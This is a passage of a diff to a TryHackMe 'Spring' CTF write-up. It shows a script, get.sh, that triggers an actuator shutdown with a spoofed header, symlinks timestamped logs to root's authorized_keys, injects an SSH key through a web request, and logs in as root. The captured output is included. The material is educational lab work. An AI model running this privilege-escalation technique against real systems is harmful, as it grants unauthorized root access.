+● spring.service - Spring Boot Application
+   Loaded: loaded (/etc/systemd/system/spring.service; enabled; vendor preset: enabled)
+   Active: active (running) since Fri 2026-01-16 ...; 2h 18min ago
+ Main PID: 853
+    Tasks: 3 (limit: 1079)
+   CGroup: /system.slice/spring.service
+           ├─853 /bin/bash /root/start_tomcat.sh
+           ├─922 sudo su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.security.egd=file:///dev/urandom -jar /opt/spring/sources/new/spring-0.0.1-SNAPS
+           └─924 tee /home/johnsmith/tomcatlogs/1768582278.log
+
+Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.
+lines 1-11/11 (END)
+```
 
 ```bash
 johnsmith@spring:/$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/nul
@@ -1013,21 +1033,157 @@ johnsmith@spring:/$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/nul
 -rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
 ```
 
-<br>
-<br>
-<br>
-
+```bash
+johnsmith@spring:~$ cd tomcatlogs/pwd/
+/home/johnsmith/tomcatlogs
+```
 
 ```bash
+johnsmith@spring:~/tomcatlogs$ ls
+1594410148.log  1594410465.log  1594413491.log  1594552377.log  1594574751.log  1594575333.log  1594576008.log  1594584453.log  1768582278.log
+```
 
-
+```bash
+johnsmith@spring:~/tomcatlogs$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+johnsmi+  7051  0.0  0.3  21272  3684 pts/0    S+   18:58   0:00 bash
+johnsmi+  7084  0.0  0.7  76692  6968 ?        Ss   19:07   0:00 /lib/systemd/systemd --user
+johnsmi+  7222  0.0  0.5  21460  5160 pts/1    Ss   19:08   0:00 -bash
+johnsmi+  7882  0.0  0.3  36076  3364 pts/1    R+   19:31   0:00 ps aux
 ```
 
 
+<br>
+<h1 align="center">Exploit: Root LPE via Symlink Race Condition and Log Poisoning : <a href="https://raw.githubusercontent.com/RosanaFSS/Cybersecurity-Journey-TryHackMe/refs/heads/CTFs-%26-Infos/Hard%20%F0%9F%9A%A9%20-%20Spring/Hard%20%F0%9F%9A%A9%20-%20Spring%20-%20get.sh">get.sh</a><a id='7'></a></h1>
 
+```bash
+johnsmith@spring:~/tomcatlogs$ nano get.sh
+```
+
+```bash
+#!/bin/bash
+
+pubkey=$(cat key.pub)
+
+curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k
+
+d=$(date '+%s')
+
+for i in {1..30}
+do
+ let time=$(( d + i ))
+ ln -s /root/.ssh/authorized_keys "$time.log"
+done
+
+sleep 30s
+
+curl --data-urlencode "name=$pubkey" https://localhost/ -k
+sleep 5s
+
+ssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost
+```
+
+
+```bash
+johnsmith@spring:~/tomcatlogs$ bash get.sh
+{"message":"Shutting down, bye..."}
+whoami
+Hello,ssh-... johnsmith@spring!
+whoami
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Jan 16 ... 2026
+
+  System load:  1.02               Processes:           107
+  Usage of /:   11.7% of 58.80GB   Users logged in:     1
+  Memory usage: 36%                IP address for ens5: ...
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+9 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+root@spring:~#
+```
+
+```bash
+root@spring:~# whoami
+root
+```
+
+```bash
+root@spring:~# pwd
+/root
+```
+
+```bash
+root@spring:~# ls
+root.txt  start_tomcat.sh
+```
+
+```bash
+root@spring:~# cat root.txt
+THM{•••••••••••••••••••••••••••}
+```
+
+<img width="1479" height="668" alt="image" src="https://github.com/user-attachments/assets/991ce974-b3a4-4bcb-be83-1daa89043cbe" />
 
 <br>
+<br>
+<br>
 <p>1.3. <em>What's the flag in root.txt?</em><br>
-<code>____________________________</code></p>
+<code>THM{•••••••••••••••••••••••••••}</code></p>
+
+<br>
+<br>
+<br>
+<h1 align="center">Challenge Completed</h1>
 
 
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/dd785c18-5e60-4ddf-9c5c-2d0c4e505fe4"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/28eb67db-345f-48ab-b2b9-4d4ee9db87f9"></p>
+
+
+<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>
+
+<div align="center"><h6>
+
+| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
+|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
+|16     |Hard 🚩 - Spring                      |15 |     87ᵗʰ  |     3ʳᵈ    |      540ᵗʰ   |        4ᵗʰ     |    138,942  |    1,066    |    87     |
+|14     |Insane 🚩 - Scheme Catcher            |13 |     87ᵗʰ  |     3ʳᵈ    |      534ᵗʰ   |        5ᵗʰ     |    138,822  |    1,065    |    87     |
+|13     |Hard 🚩 - Breachblocker Unlocker      |12 |     86ᵗʰ  |     3ʳᵈ    |      526ᵗʰ   |        5ᵗʰ     |    138,732  |    1,064    |    87     |
+|11     |Medium 🚩 - Azure: Eyes Wide Shut     |10 |     86ᵗʰ  |     3ʳᵈ    |      558ᵗʰ   |        5ᵗʰ     |    138,450  |    1,063    |    86     |
+|8      |Medium ⚙️ - Phishing Unfolding        | 7 |     86ᵗʰ  |     3ʳᵈ    |      508ᵗʰ   |        4ᵗʰ     |    138,372  |    1,062    |    84     |
+|8      |Easy ⚙️ - Introduction to Phishing    | 7 |     96ᵗʰ  |     3ʳᵈ    |    2,479ᵗʰ   |       32ⁿᵈ     |    137,117  |    1,062    |    84     |
+|8      |Medium 🔗 - KaffeeSec - SoMeSINT      | 7 |     98ᵗʰ  |     3ʳᵈ    |    2,847ᵗʰ   |       38ᵗʰ     |    137,052  |    1,062    |    84     |
+|7      |Hard 🚩 - Hack Back                   | 6 |     98ᵗʰ  |     3ʳᵈ    |    2,798ᵗʰ   |       37ᵗʰ     |    136,908  |    1,061    |    84     |
+|7      |Hard 🚩 - Dead End?                   | 6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
+|6      |Easy 🔗 - Linux Strength Training     | 5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
+|4      |Medium 🚩 - JVM Reverse Engineering   | 3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
+|3      |Medium 🚩 - Carrotbane of My Existence| 2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
+|2      |Easy 🔗 - Learn Rust                  | 1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |
+
+
+</h6></div><br>
+
+
+<p align="center">Global All Time:    87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/3fd795ed-f933-4e76-812a-7c55862c1713"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/b8e78640-e780-4254-a38d-241787bdd692"><br><br>
+                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/a4c52b58-8fe5-48d3-aa5e-03fc1fcc7498"><br><br>
+                  Global monthly:     540ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/84e1a1c9-7d54-445e-a174-70b57db6dd09"><br><br>
+                  Brazil monthly:       4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/75ca885d-4f1b-4bf9-a215-4a675d7a32da"></p>
+
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p
